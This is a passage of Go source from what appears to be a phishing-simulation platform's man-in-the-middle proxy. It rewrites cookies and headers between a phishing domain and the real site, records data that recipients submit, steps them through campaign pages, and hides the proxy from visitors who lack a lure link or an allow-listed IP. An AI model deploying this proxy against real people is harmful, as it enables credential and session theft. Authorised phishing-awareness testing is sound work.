	if phishHost := m.replaceHostWithPhished(strings.TrimPrefix(cDomain, "."), config); phishHost != "" {
		if strings.HasPrefix(cDomain, ".") {
			ck.Domain = "." + phishHost
		} else {
			ck.Domain = phishHost
		}
	} else {
		ck.Domain = cDomain
	}
}

func (m *ProxyHandler) sameSiteToString(sameSite http.SameSite) string {
	switch sameSite {
	case http.SameSiteDefaultMode:
		return "Default"
	case http.SameSiteLaxMode:
		return "Lax"
	case http.SameSiteStrictMode:
		return "Strict"
	case http.SameSiteNoneMode:
		return "None"
	default:
		return fmt.Sprintf("Unknown(%d)", int(sameSite))
	}
}

func (m *ProxyHandler) getCampaignRecipientIDFromURLParams(req *http.Request) (*uuid.UUID, string) {
	ctx := req.Context()

	campaignRecipient, paramName, err := server.GetCampaignRecipientFromURLParams(
		ctx,
		req,
		m.IdentifierRepository,
		m.CampaignRecipientRepository,
	)
	if err != nil {
		m.logger.Errorw("failed to get identifiers for URL param extraction", "error", err)
		return nil, ""
	}

	if campaignRecipient == nil {
		return nil, ""
	}

	campaignRecipientID := campaignRecipient.ID.MustGet()
	return &campaignRecipientID, paramName
}

// Header normalization methods
func (m *ProxyHandler) normalizeRequestHeaders(req *http.Request, session *ProxySession) {
	configMap := m.configToMap(&session.Config)

	// fix origin header
	if origin := req.Header.Get("Origin"); origin != "" {
		if oURL, err := url.Parse(origin); err == nil {
			if rHost := m.replaceHostWithOriginal(oURL.Host, configMap); rHost != "" {
				oURL.Host = rHost
				req.Header.Set("Origin", oURL.String())
			}
		}
	}

	// fix referer header
	if referer := req.Header.Get("Referer"); referer != "" {
		if rURL, err := url.Parse(referer); err == nil {
			if rHost := m.replaceHostWithOriginal(rURL.Host, configMap); rHost != "" {
				rURL.Host = rHost
				req.Header.Set("Referer", rURL.String())
			}
		}
	}

	// prevent caching and fix headers
	req.Header.Set("Cache-Control", "no-cache")

	if secFetchDest := req.Header.Get("Sec-Fetch-Dest"); secFetchDest == "iframe" {
		req.Header.Set("Sec-Fetch-Dest", "document")
	}

	if req.Body != nil && (req.Method == "POST" || req.Method == "PUT" || req.Method == "PATCH") {
		if req.Header.Get("Content-Length") == "" && req.ContentLength > 0 {
			req.Header.Set("Content-Length", fmt.Sprintf("%d", req.ContentLength))
		}
	}
}

func (m *ProxyHandler) readAndDecompressBody(resp *http.Response) ([]byte, bool, error) {
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, false, err
	}

	encoding := resp.Header.Get("Content-Encoding")
	switch strings.ToLower(encoding) {
	case "gzip":
		gzipReader, err := gzip.NewReader(bytes.NewBuffer(body))
		if err != nil {
			return body, false, err
		}
		defer gzipReader.Close()
		decompressed, err := io.ReadAll(gzipReader)
		if err != nil {
			return body, false, err
		}
		return decompressed, true, nil
	case "deflate":
		deflateReader := flate.NewReader(bytes.NewBuffer(body))
		defer deflateReader.Close()
		decompressed, err := io.ReadAll(deflateReader)
		if err != nil {
			return body, false, err
		}
		return decompressed, true, nil
	case "br":
		return body, false, nil
	default:
		return body, false, nil
	}
}

func (m *ProxyHandler) updateResponseBody(resp *http.Response, body []byte, wasCompressed bool) {
	if wasCompressed {
		encoding := resp.Header.Get("Content-Encoding")
		switch strings.ToLower(encoding) {
		case "gzip":
			var compressedBuffer bytes.Buffer
			gzipWriter := gzip.NewWriter(&compressedBuffer)
			if _, err := gzipWriter.Write(body); err != nil {
				m.logger.Errorw("failed to write gzip compressed body", "error", err)
			}
			if err := gzipWriter.Close(); err != nil {
				m.logger.Errorw("failed to close gzip writer", "error", err)
			}
			body = compressedBuffer.Bytes()
		case "deflate":
			var compressedBuffer bytes.Buffer
			deflateWriter, err := flate.NewWriter(&compressedBuffer, flate.DefaultCompression)
			if err != nil {
				m.logger.Errorw("failed to create deflate writer", "error", err)
				break
			}
			if _, err := deflateWriter.Write(body); err != nil {
				m.logger.Errorw("failed to write deflate compressed body", "error", err)
			}
			if err := deflateWriter.Close(); err != nil {
				m.logger.Errorw("failed to close deflate writer", "error", err)
			}
			body = compressedBuffer.Bytes()
		}
	}

	resp.Body = io.NopCloser(bytes.NewReader(body))
	resp.ContentLength = int64(len(body))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
}

func (m *ProxyHandler) shouldProcessContent(contentType string) bool {
	processTypes := []string{"text/html", "application/javascript", "application/x-javascript", "text/javascript", "text/css", "application/json"}
	for _, pType := range processTypes {
		if strings.Contains(contentType, pType) {
			return true
		}
	}
	return false
}

func (m *ProxyHandler) handleImmediateCampaignRedirect(session *ProxySession, resp *http.Response, req *http.Request, captureLocation string) {
	m.handleCampaignFlowProgression(session, req)

	nextPageType := session.NextPageType.Load().(string)
	if nextPageType == "" {
		return
	}

	redirectURL := m.buildCampaignFlowRedirectURL(session, nextPageType)
	if redirectURL == "" {
		return
	}

	resp.StatusCode = 302
	resp.Status = "302 Found"
	resp.Header.Set("Location", redirectURL)
	resp.Header.Set("Content-Length", "0")
	resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	resp.Body = io.NopCloser(bytes.NewReader([]byte{}))
	session.NextPageType.Store("")
}

func (m *ProxyHandler) handleCampaignFlowProgression(session *ProxySession, req *http.Request) {
	if session.CampaignRecipientID == nil || session.CampaignID == nil {
		return
	}

	ctx := req.Context()
	templateID, err := session.Campaign.TemplateID.Get()
	if err != nil {
		m.logger.Errorw("failed to get template ID for campaign flow progression", "error", err)
		return
	}

	cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{})
	if err != nil {
		m.logger.Errorw("failed to get campaign template for flow progression", "error", err, "templateID", templateID)
		return
	}

	currentPageType := m.getCurrentPageType(req, cTemplate, session)
	nextPageType := m.getNextPageType(currentPageType, cTemplate)

	if nextPageType != data.PAGE_TYPE_DONE && nextPageType != currentPageType && session.IsComplete.Load() {
		session.NextPageType.Store(nextPageType)
	}
}

func (m *ProxyHandler) getCurrentPageType(req *http.Request, template *model.CampaignTemplate, session *ProxySession) string {
	if template.StateIdentifier != nil {
		stateParamKey := template.StateIdentifier.Name.MustGet()
		encryptedParam := req.URL.Query().Get(stateParamKey)
		if encryptedParam != "" && session.CampaignID != nil {
			secret := utils.UUIDToSecret(session.CampaignID)
			if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
				return decrypted
			}
		}
	}

	if template.URLIdentifier != nil {
		urlParamKey := template.URLIdentifier.Name.MustGet()
		campaignRecipientIDParam := req.URL.Query().Get(urlParamKey)
		if campaignRecipientIDParam != "" {
			if _, errPage := template.BeforeLandingPageID.Get(); errPage == nil {
				return data.PAGE_TYPE_BEFORE
			}
			if _, errProxy := template.BeforeLandingProxyID.Get(); errProxy == nil {
				return data.PAGE_TYPE_BEFORE
			}
			return data.PAGE_TYPE_LANDING
		}
	}

	return data.PAGE_TYPE_LANDING
}

func (m *ProxyHandler) getNextPageType(currentPageType string, template *model.CampaignTemplate) string {
	switch currentPageType {
	case data.PAGE_TYPE_EVASION:
		if _, errPage := template.BeforeLandingPageID.Get(); errPage == nil {
			return data.PAGE_TYPE_BEFORE
		}
		if _, errProxy := template.BeforeLandingProxyID.Get(); errProxy == nil {
			return data.PAGE_TYPE_BEFORE
		}
		return data.PAGE_TYPE_LANDING
	case data.PAGE_TYPE_BEFORE:
		return data.PAGE_TYPE_LANDING
	case data.PAGE_TYPE_LANDING:
		if _, errPage := template.AfterLandingPageID.Get(); errPage == nil {
			return data.PAGE_TYPE_AFTER
		}
		if _, errProxy := template.AfterLandingProxyID.Get(); errProxy == nil {
			return data.PAGE_TYPE_AFTER
		}
		return data.PAGE_TYPE_DONE
	case data.PAGE_TYPE_AFTER:
		return data.PAGE_TYPE_DONE
	default:
		return data.PAGE_TYPE_DONE
	}
}

func (m *ProxyHandler) shouldRedirectForCampaignFlow(session *ProxySession, req *http.Request) bool {
	nextPageTypeStr := session.NextPageType.Load().(string)
	return nextPageTypeStr != "" && nextPageTypeStr != data.PAGE_TYPE_DONE && session.IsComplete.Load()
}

func (m *ProxyHandler) createCampaignFlowRedirect(session *ProxySession, resp *http.Response) *http.Response {
	if resp == nil {
		return nil
	}

	nextPageTypeStr := session.NextPageType.Load().(string)
	session.NextPageType.Store("")

	redirectURL := m.buildCampaignFlowRedirectURL(session, nextPageTypeStr)
	if redirectURL == "" {
		return resp
	}

	redirectResp := &http.Response{
		StatusCode: 302,
		Header:     make(http.Header),
		Body:       io.NopCloser(bytes.NewReader([]byte{})),
		Request:    resp.Request,
	}

	redirectResp.Header.Set("Location", redirectURL)
	redirectResp.Header.Set("Content-Length", "0")

	return redirectResp
}

func (m *ProxyHandler) buildCampaignFlowRedirectURL(session *ProxySession, nextPageType string) string {
	if session.CampaignRecipientID == nil || session.Campaign == nil {
		return ""
	}

	templateID, err := session.Campaign.TemplateID.Get()
	if err != nil {
		m.logger.Errorw("failed to get template ID for redirect URL", "error", err)
		return ""
	}

	ctx := context.Background()
	cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
		WithDomain:     true,
		WithIdentifier: true,
	})
	if err != nil {
		m.logger.Errorw("failed to get campaign template for redirect URL", "error", err, "templateID", templateID)
		return ""
	}

	var targetURL string
	var usesTemplateDomain bool

	switch nextPageType {
	case data.PAGE_TYPE_LANDING:
		if _, err := cTemplate.LandingPageID.Get(); err == nil {
			usesTemplateDomain = true
		}
	case data.PAGE_TYPE_AFTER:
		if _, err := cTemplate.AfterLandingPageID.Get(); err == nil {
			usesTemplateDomain = true
		}
	case "deny":
		// deny pages should use template domain if available
		usesTemplateDomain = true
	default:
		if redirectURL, err := cTemplate.AfterLandingPageRedirectURL.Get(); err == nil {
			if url := redirectURL.String(); len(url) > 0 {
				return url
			}
		}
	}

	if usesTemplateDomain && cTemplate.Domain != nil {
		domainName, err := cTemplate.Domain.Name.Get()
		if err != nil {
			m.logger.Errorw("failed to get domain name for redirect URL", "error", err)
			return ""
		}

		if urlPath, err := cTemplate.URLPath.Get(); err == nil {
			targetURL = fmt.Sprintf("https://%s%s", domainName, urlPath.String())
		} else {
			targetURL = fmt.Sprintf("https://%s/", domainName)
		}
	} else if session.Domain != nil {
		targetURL = fmt.Sprintf("https://%s/", session.Domain.Name)
	}

	if targetURL == "" {
		return ""
	}

	// add campaign parameters
	if cTemplate.URLIdentifier != nil && cTemplate.StateIdentifier != nil {
		urlParamKey := cTemplate.URLIdentifier.Name.MustGet()
		stateParamKey := cTemplate.StateIdentifier.Name.MustGet()
		secret := utils.UUIDToSecret(session.CampaignID)
		encryptedPageType, err := utils.Encrypt(nextPageType, secret)
		if err != nil {
			m.logger.Errorw("failed to encrypt page type for redirect URL", "error", err, "pageType", nextPageType)
			return ""
		}
		separator := "?"
		if strings.Contains(targetURL, "?") {
			separator = "&"
		}

		targetURL = fmt.Sprintf("%s%s%s=%s&%s=%s",
			targetURL, separator, urlParamKey, session.CampaignRecipientID.String(),
			stateParamKey, encryptedPageType,
		)
	}

	return targetURL
}

func (m *ProxyHandler) createCampaignSubmitEvent(session *ProxySession, capturedData interface{}, req *http.Request) {
	if session.CampaignID == nil || session.CampaignRecipientID == nil {
		return
	}

	ctx := context.Background()

	// use campaign from session if available, otherwise fetch
	campaign := session.Campaign
	if campaign == nil {
		var err error
		campaign, err = m.CampaignRepository.GetByID(ctx, session.CampaignID, &repository.CampaignOption{})
		if err != nil {
			m.logger.Errorw("failed to get campaign for proxy capture event", "error", err)
			return
		}
	}

	// save captured data only if SaveSubmittedData is enabled
	var submittedDataJSON []byte
	var err error
	if campaign.SaveSubmittedData.MustGet() {
		submittedDataJSON, err = json.Marshal(capturedData)
		if err != nil {
			m.logger.Errorw("failed to marshal captured data for campaign event", "error", err)
			return
		}
	} else {
		// save empty data but still record the capture event
		submittedDataJSON = []byte("{}")
	}

	submitDataEventID := cache.EventIDByName[data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA]
	eventID := uuid.New()
	// use the event creation below instead of service call

	// mark session as complete
	session.IsComplete.Store(true)

	clientIP := utils.ExtractClientIP(req)
	event := &model.CampaignEvent{
		ID:          &eventID,
		CampaignID:  session.CampaignID,
		RecipientID: session.RecipientID,
		EventID:     submitDataEventID,
		Data:        vo.NewOptionalString1MBMust(string(submittedDataJSON)),
		IP:          vo.NewOptionalString64Must(clientIP),
		UserAgent:   vo.NewOptionalString255Must(req.UserAgent()),
	}

	err = m.CampaignRepository.SaveEvent(ctx, event)
	if err != nil {
		m.logger.Errorw("failed to create campaign submit event", "error", err)
	}
}

func (m *ProxyHandler) parseProxyConfig(configStr string) (*service.ProxyServiceConfigYAML, error) {
	var yamlConfig service.ProxyServiceConfigYAML
	err := yaml.Unmarshal([]byte(configStr), &yamlConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to parse YAML config: %w", err)
	}

	m.setProxyConfigDefaults(&yamlConfig)

	err = service.CompilePathPatterns(&yamlConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to compile path patterns: %w", err)
	}

	return &yamlConfig, nil
}

func (m *ProxyHandler) setProxyConfigDefaults(config *service.ProxyServiceConfigYAML) {
	if config.Version == "" {
		config.Version = "0.0"
	}

	for domain, domainConfig := range config.Hosts {
		if domainConfig != nil && domainConfig.Capture != nil {
			for i := range domainConfig.Capture {
				if domainConfig.Capture[i].Required == nil {
					trueValue := true
					domainConfig.Capture[i].Required = &trueValue
				}
			}
		}
		if domainConfig != nil && domainConfig.Response != nil {
			for i := range domainConfig.Response {
				// set default status to 200 if not specified
				if domainConfig.Response[i].Status == 0 {
					domainConfig.Response[i].Status = 200
				}
			}
		}

		// set defaults for domain access control
		if domainConfig != nil && domainConfig.Access != nil {
			// set default mode to private if not specified
			if domainConfig.Access.Mode == "" {
				domainConfig.Access.Mode = "private"
			}
			// set default deny action for private mode if not specified
			if domainConfig.Access.Mode == "private" && domainConfig.Access.OnDeny == "" {
				domainConfig.Access.OnDeny = "404"
			}
		}
		config.Hosts[domain] = domainConfig
	}

	// set defaults for global response rules
	if config.Global != nil && config.Global.Response != nil {
		for i := range config.Global.Response {
			// set default status to 200 if not specified
			if config.Global.Response[i].Status == 0 {
				config.Global.Response[i].Status = 200
			}
		}
	}

	// set defaults for global access control
	if config.Global != nil && config.Global.Access != nil {
		// set default mode to private if not specified
		if config.Global.Access.Mode == "" {
			config.Global.Access.Mode = "private"
		}
		// set default deny action for private mode if not specified
		if config.Global.Access.Mode == "private" && config.Global.Access.OnDeny == "" {
			config.Global.Access.OnDeny = "404"
		}
	}
}

func (m *ProxyHandler) GetCookieName() string {
	return m.cookieName
}

func (m *ProxyHandler) IsValidProxyCookie(cookie string) bool {
	return m.isValidSessionCookie(cookie)
}

// checkResponseRules checks if any response rules match the current request
func (m *ProxyHandler) checkResponseRules(req *http.Request, reqCtx *RequestContext) *http.Response {
	// check global response rules first
	if reqCtx.ProxyConfig.Global != nil {
		if resp := m.matchGlobalResponseRules(reqCtx.ProxyConfig.Global, req, reqCtx); resp != nil {
			return resp
		}
	}

	// check domain-specific response rules
	for _, hostConfig := range reqCtx.ProxyConfig.Hosts {
		if hostConfig != nil && hostConfig.To == reqCtx.PhishDomain {
			if resp := m.matchDomainResponseRules(hostConfig, req, reqCtx); resp != nil {
				return resp
			}
		}
	}

	return nil
}

// shouldForwardRequest checks if any matching response rule has forward: true
func (m *ProxyHandler) shouldForwardRequest(req *http.Request, reqCtx *RequestContext) bool {
	// check global response rules first
	if reqCtx.ProxyConfig.Global != nil {
		if shouldForward := m.checkForwardInGlobalRules(reqCtx.ProxyConfig.Global, req); shouldForward {
			return true
		}
	}

	// check domain-specific response rules
	for _, hostConfig := range reqCtx.ProxyConfig.Hosts {
		if hostConfig != nil && hostConfig.To == reqCtx.PhishDomain {
			if shouldForward := m.checkForwardInDomainRules(hostConfig, req); shouldForward {
				return true
			}
		}
	}

	return false
}

// checkForwardInGlobalRules checks if any matching global response rule has forward: true
func (m *ProxyHandler) checkForwardInGlobalRules(rules *service.ProxyServiceRules, req *http.Request) bool {
	if rules == nil || rules.Response == nil {
		return false
	}

	for _, rule := range rules.Response {
		if rule.PathRe != nil && rule.PathRe.MatchString(req.URL.Path) {
			return rule.Forward
		}
	}

	return false
}

// checkForwardInDomainRules checks if any matching domain response rule has forward: true
func (m *ProxyHandler) checkForwardInDomainRules(rules *service.ProxyServiceDomainConfig, req *http.Request) bool {
	if rules == nil || rules.Response == nil {
		return false
	}

	for _, rule := range rules.Response {
		if rule.PathRe != nil && rule.PathRe.MatchString(req.URL.Path) {
			return rule.Forward
		}
	}

	return false
}

// matchGlobalResponseRules checks global response rules
func (m *ProxyHandler) matchGlobalResponseRules(rules *service.ProxyServiceRules, req *http.Request, reqCtx *RequestContext) *http.Response {
	if rules == nil || rules.Response == nil {
		return nil
	}

	for _, rule := range rules.Response {
		if rule.PathRe != nil && rule.PathRe.MatchString(req.URL.Path) {
			return m.createResponseFromRule(rule, req, reqCtx)
		}
	}

	return nil
}

// matchDomainResponseRules checks domain-specific response rules
func (m *ProxyHandler) matchDomainResponseRules(rules *service.ProxyServiceDomainConfig, req *http.Request, reqCtx *RequestContext) *http.Response {
	if rules == nil || rules.Response == nil {
		return nil
	}

	for _, rule := range rules.Response {
		if rule.PathRe != nil && rule.PathRe.MatchString(req.URL.Path) {
			return m.createResponseFromRule(rule, req, reqCtx)
		}
	}

	return nil
}

// createResponseFromRule creates an HTTP response based on a response rule
func (m *ProxyHandler) createResponseFromRule(rule service.ProxyServiceResponseRule, req *http.Request, reqCtx *RequestContext) *http.Response {
	// ensure status code defaults to 200 if not set
	status := rule.Status
	if status == 0 {
		status = 200
	}

	resp := &http.Response{
		StatusCode: status,
		Header:     make(http.Header),
		Request:    req,
	}

	// set headers
	for name, value := range rule.Headers {
		resp.Header.Set(name, value)
	}

	// process body
	body := rule.Body

	resp.Body = io.NopCloser(strings.NewReader(body))
	resp.ContentLength = int64(len(body))

	// set content-length header if not already set
	if resp.Header.Get("Content-Length") == "" {
		resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
	}

	return resp
}

func (m *ProxyHandler) CleanupExpiredSessions() {
	now := time.Now()
	cleanedCount := 0

	m.sessions.Range(func(key, value interface{}) bool {
		sessionID, ok := key.(string)
		if !ok {
			return true
		}
		session, ok := value.(*ProxySession)
		if !ok {
			m.sessions.Delete(sessionID)
			cleanedCount++
			return true
		}

		sessionAge := now.Sub(session.CreatedAt)
		if sessionAge > time.Duration(PROXY_COOKIE_MAX_AGE)*time.Second {
			m.sessions.Delete(sessionID)
			if session.CampaignRecipientID != nil {
				m.campaignRecipientSessions.Delete(session.CampaignRecipientID.String())
			}
			cleanedCount++
		}
		return true
	})

	if cleanedCount > 0 {
		m.logger.Debugw("cleaned up expired sessions", "count", cleanedCount)
	}

	// cleanup expired IP allow listed entries
	ipCleanedCount := m.IPAllowListService.ClearExpired()
	if ipCleanedCount > 0 {
		m.logger.Debugw("cleaned up expired IP allow listed entries", "count", ipCleanedCount)
	}
}

func (m *ProxyHandler) getTargetDomainForPhishingDomain(phishingDomain string) (string, error) {
	if strings.Contains(phishingDomain, ":") {
		phishingDomain = strings.Split(phishingDomain, ":")[0]
	}

	var dbDomain database.Domain
	result := m.DomainRepository.DB.Where("name = ?", phishingDomain).First(&dbDomain)
	if result.Error != nil {
		return "", fmt.Errorf("failed to get domain configuration: %w", result.Error)
	}

	if dbDomain.Type != "proxy" {
		return "", fmt.Errorf("domain is not configured for proxy")
	}

	if dbDomain.ProxyTargetDomain == "" {
		return "", fmt.Errorf("no proxy target domain configured")
	}

	targetDomain := dbDomain.ProxyTargetDomain
	if strings.Contains(targetDomain, "://") {
		if parsedURL, err := url.Parse(targetDomain); err == nil {
			return parsedURL.Host, nil
		}
	}

	return targetDomain, nil
}

func (m *ProxyHandler) isValidSessionCookie(cookie string) bool {
	if cookie == "" {
		return false
	}
	_, exists := m.sessions.Load(cookie)
	return exists
}

func (m *ProxyHandler) configToMap(configMap *sync.Map) map[string]service.ProxyServiceDomainConfig {
	result := make(map[string]service.ProxyServiceDomainConfig)
	configMap.Range(func(key, value interface{}) bool {
		result[key.(string)] = value.(service.ProxyServiceDomainConfig)
		return true
	})
	return result
}

func (m *ProxyHandler) createServiceUnavailableResponse(message string) *http.Response {
	resp := &http.Response{
		StatusCode: http.StatusServiceUnavailable,
		Header:     make(http.Header),
		Body:       io.NopCloser(strings.NewReader(message)),
	}
	resp.Header.Set("Content-Type", "text/plain")
	return resp
}

func (m *ProxyHandler) clearAllCookiesForInitialMitmVisit(resp *http.Response, reqCtx *RequestContext) {
	// clear all existing cookies by setting them to expire immediately
	if resp.Request != nil {
		for _, cookie := range resp.Request.Cookies() {
			// create expired cookie to clear it
			expiredCookie := &http.Cookie{
				Name:     cookie.Name,
				Value:    "",
				Path:     "/",
				Domain:   reqCtx.PhishDomain,
				Expires:  time.Unix(0, 0),
				MaxAge:   -1,
				HttpOnly: true,
				Secure:   true,
				SameSite: http.SameSiteNoneMode,
			}
			resp.Header.Add("Set-Cookie", expiredCookie.String())
		}
	}
}

func (m *ProxyHandler) writeResponse(w http.ResponseWriter, resp *http.Response) error {
	// check for nil response
	if resp == nil {
		m.logger.Errorw("response is nil in writeResponse")
		w.WriteHeader(http.StatusInternalServerError)
		return errors.New("response is nil")
	}

	// copy headers
	if resp.Header != nil {
		for k, v := range resp.Header {
			for _, val := range v {
				w.Header().Add(k, val)
			}
		}
	}

	// set status code
	w.WriteHeader(resp.StatusCode)

	// copy body
	if resp.Body != nil {
		defer resp.Body.Close()
		_, err := io.Copy(w, resp.Body)
		return err
	}
	return nil
}

// evaluatePathAccess checks if a path is allowed based on access control rules
func (m *ProxyHandler) evaluatePathAccess(path string, reqCtx *RequestContext, hasSession bool, req *http.Request) (bool, string) {
	// check domain-specific rules first
	if reqCtx.Domain != nil && reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Hosts != nil {

		// find the domain config where the "to" field matches our phishing domain
		for _, domainConfig := range reqCtx.ProxyConfig.Hosts {
			if domainConfig != nil && domainConfig.To == reqCtx.PhishDomain {
				if domainConfig.Access != nil {
					allowed, action := m.checkAccessRules(path, domainConfig.Access, hasSession, reqCtx, req)
					// domain rule found - return its decision (allow or deny)
					return allowed, action
				}
				// domain found but no access section - fall through to check global rules
				break
			}
		}

	}

	// check global rules (either no domain found, or domain found but no access section)
	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Global != nil && reqCtx.ProxyConfig.Global.Access != nil {
		allowed, action := m.checkAccessRules(path, reqCtx.ProxyConfig.Global.Access, hasSession, reqCtx, req)
		return allowed, action
	}

	// no configuration at all - use private mode default
	return m.applyDefaultPrivateMode(reqCtx, req)
}

// checkAccessRules evaluates access control rules for a given path
func (m *ProxyHandler) checkAccessRules(path string, accessControl *service.ProxyServiceAccessControl, hasSession bool, reqCtx *RequestContext, req *http.Request) (bool, string) {
	if accessControl == nil {
		return true, "" // no access control = allow everything
	}

	action := accessControl.OnDeny
	if action == "" {
		action = "404" // default action
	}

	switch accessControl.Mode {
	case "public":
		return true, "" // allow all traffic (traditional proxy mode)
	case "private":
		// private mode: strict access control like evilginx2

		// if this is a lure request (has campaign recipient id), allow it
		if reqCtx != nil && reqCtx.CampaignRecipientID != nil {
			return true, ""
		}

		// check if IP is allowlisted for this proxy config (from previous lure access)
		if reqCtx != nil && reqCtx.Domain != nil && req != nil {
			clientIP := m.getClientIP(req)
			if clientIP != "" && m.IPAllowListService.IsIPAllowed(clientIP, reqCtx.Domain.ProxyID.String()) {
				return true, ""
			}
		}

		// no lure request and IP not allow listed - deny access
		return false, action
	default:
		return true, "" // safe default
	}
}

// applyDefaultPrivateMode applies private mode behavior when no access control is specified
func (m *ProxyHandler) applyDefaultPrivateMode(reqCtx *RequestContext, req *http.Request) (bool, string) {
	// if this is a lure request (has campaign recipient id), allow it
	if reqCtx != nil && reqCtx.CampaignRecipientID != nil {
		return true, ""
	}

	// check if IP is allowlisted for this proxy config (from previous lure access)
	if reqCtx != nil && reqCtx.Domain != nil && req != nil {
		clientIP := m.getClientIP(req)
		if clientIP != "" && m.IPAllowListService.IsIPAllowed(clientIP, reqCtx.Domain.ProxyID.String()) {
			return true, ""
		}
	}

	// no lure request and IP not allow listed - deny with default action
	return false, "404"
}

// getClientIP extracts the real client IP from request headers
func (m *ProxyHandler) getClientIP(req *http.Request) string {
	// check common proxy headers first
	proxyHeaders := []string{
		"X-Forwarded-For",
		"X-Real-IP",
		"X-Client-IP",
		"CF-Connecting-IP",
		"True-Client-IP",
	}

	for _, header := range proxyHeaders {
		ip := req.Header.Get(header)
		if ip != "" {
			// X-Forwarded-For can contain multiple IPs, take the first
			if strings.Contains(ip, ",") {
				ip = strings.TrimSpace(strings.Split(ip, ",")[0])
			}
			return ip
		}
	}

	// fallback to remote addr
	if req.RemoteAddr != "" {
		ip, _, err := net.SplitHostPort(req.RemoteAddr)
		if err != nil {
			return req.RemoteAddr // might not have port
		}
		return ip
	}

	return ""
}

// createDenyResponse creates an appropriate response for denied access
func (m *ProxyHandler) createDenyResponse(req *http.Request, reqCtx *RequestContext, denyAction string, hasSession bool) *http.Response {
	// construct proper full URL for logging
	fullURL := fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.RequestURI())

	// log the denial for debugging
	m.logger.Debugw("access denied for path",
		"path", req.URL.Path,
		"full_url", fullURL,
		"phish_domain", reqCtx.PhishDomain,
		"target_domain", reqCtx.TargetDomain,
		"has_session", hasSession,
		"deny_action", denyAction,
		"user_agent", req.Header.Get("User-Agent"),
	)

	// auto-detect URLs for redirect (no prefix needed)
	if strings.HasPrefix(denyAction, "http://") || strings.HasPrefix(denyAction, "https://") {
		return m.createRedirectResponse(denyAction)
	}

	// backwards compatibility for old redirect: syntax
	if strings.HasPrefix(denyAction, "redirect:") {
		url := strings.TrimPrefix(denyAction, "redirect:")
		return m.createRedirectResponse(url)
	}

	// parse as status code
	if statusCode, err := strconv.Atoi(denyAction); err == nil {
		return m.createStatusResponse(statusCode)
	}

	return m.createStatusResponse(404) // fallback

}

// createRedirectResponse creates a redirect response
func (m *ProxyHandler) createRedirectResponse(url string) *http.Response {
	return &http.Response{
		StatusCode: 302,
		Header: map[string][]string{
			"Location": {url},
		},
	}
}

// createStatusResponse creates a response with the specified status code
func (m *ProxyHandler) createStatusResponse(statusCode int) *http.Response {
	return &http.Response{
		StatusCode: statusCode,
		Header:     make(http.Header),
		Body:       io.NopCloser(strings.NewReader("")),
	}
}

// registerPageVisitEvent registers a page visit event when a new MITM session is created
func (m *ProxyHandler) registerPageVisitEvent(req *http.Request, session *ProxySession) {
	if session.CampaignRecipientID == nil || session.CampaignID == nil || session.RecipientID == nil {
		return
	}

	ctx := req.Context()

	// get campaign template to determine page type
	templateID, err := session.Campaign.TemplateID.Get()
	if err != nil {
		m.logger.Errorw("failed to get template ID for page visit event", "error", err)
		return
	}

	cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{})
	if err != nil {
		m.logger.Errorw("failed to get campaign template for page visit event", "error", err, "templateID", templateID)
		return
	}

	// determine which page type this is
	currentPageType := m.getCurrentPageType(req, cTemplate, session)

	// determine event name based on page type
	var eventName string
	switch currentPageType {
	case data.PAGE_TYPE_EVASION:
		eventName = data.EVENT_CAMPAIGN_RECIPIENT_EVASION_PAGE_VISITED
	case data.PAGE_TYPE_BEFORE:
		eventName = data.EVENT_CAMPAIGN_RECIPIENT_BEFORE_PAGE_VISITED
	case data.PAGE_TYPE_LANDING:
		eventName = data.EVENT_CAMPAIGN_RECIPIENT_PAGE_VISITED
	case data.PAGE_TYPE_AFTER:
		eventName = data.EVENT_CAMPAIGN_RECIPIENT_AFTER_PAGE_VISITED
	default:
		eventName = data.EVENT_CAMPAIGN_RECIPIENT_PAGE_VISITED
	}

	// get event ID
	eventID, exists := cache.EventIDByName[eventName]
	if !exists {
		m.logger.Errorw("unknown event name", "eventName", eventName)
		return
	}

	// create visit event
	visitEventID := uuid.New()

	clientIP := utils.ExtractClientIP(req)
	clientIPVO := vo.NewOptionalString64Must(clientIP)
	userAgent := vo.NewOptionalString255Must(utils.Substring(req.UserAgent(), 0, 255))

	var visitEvent *model.CampaignEvent
	if !session.Campaign.IsAnonymous.MustGet() {
		visitEvent = &model.CampaignEvent{
			ID:          &visitEventID,
			CampaignID:  session.CampaignID,
			RecipientID: session.RecipientID,
			IP:          clientIPVO,
			UserAgent:   userAgent,
			EventID:     eventID,
			Data:        vo.NewEmptyOptionalString1MB(),
		}
	} else {
		visitEvent = &model.CampaignEvent{
			ID:          &visitEventID,
			CampaignID:  session.CampaignID,
			RecipientID: nil,
			IP:          vo.NewEmptyOptionalString64(),
			UserAgent:   vo.NewEmptyOptionalString255(),
			EventID:     eventID,
			Data:        vo.NewEmptyOptionalString1MB(),
		}
	}

	// save the visit event
	err = m.CampaignRepository.SaveEvent(ctx, visitEvent)
	if err != nil {
		m.logger.Errorw("failed to save MITM page visit event",
			"error", err,
			"campaignRecipientID", session.CampaignRecipientID.String(),
			"pageType", currentPageType,
		)
		return
	}

	// update most notable event for recipient if needed
	campaignRecipient, err := m.CampaignRecipientRepository.GetByID(ctx, session.CampaignRecipientID, &repository.CampaignRecipientOption{})
	if err != nil {
		m.logger.Errorw("failed to get campaign recipient for notable event update", "error", err)
		return
	}

	currentNotableEventID, _ := campaignRecipient.NotableEventID.Get()
	if cache.IsMoreNotableCampaignRecipientEventID(&currentNotableEventID, eventID) {
		campaignRecipient.NotableEventID.Set(*eventID)
		err := m.CampaignRecipientRepository.UpdateByID(ctx, session.CampaignRecipientID, campaignRecipient)
		if err != nil {
			m.logger.Errorw("failed to update notable event for MITM visit",
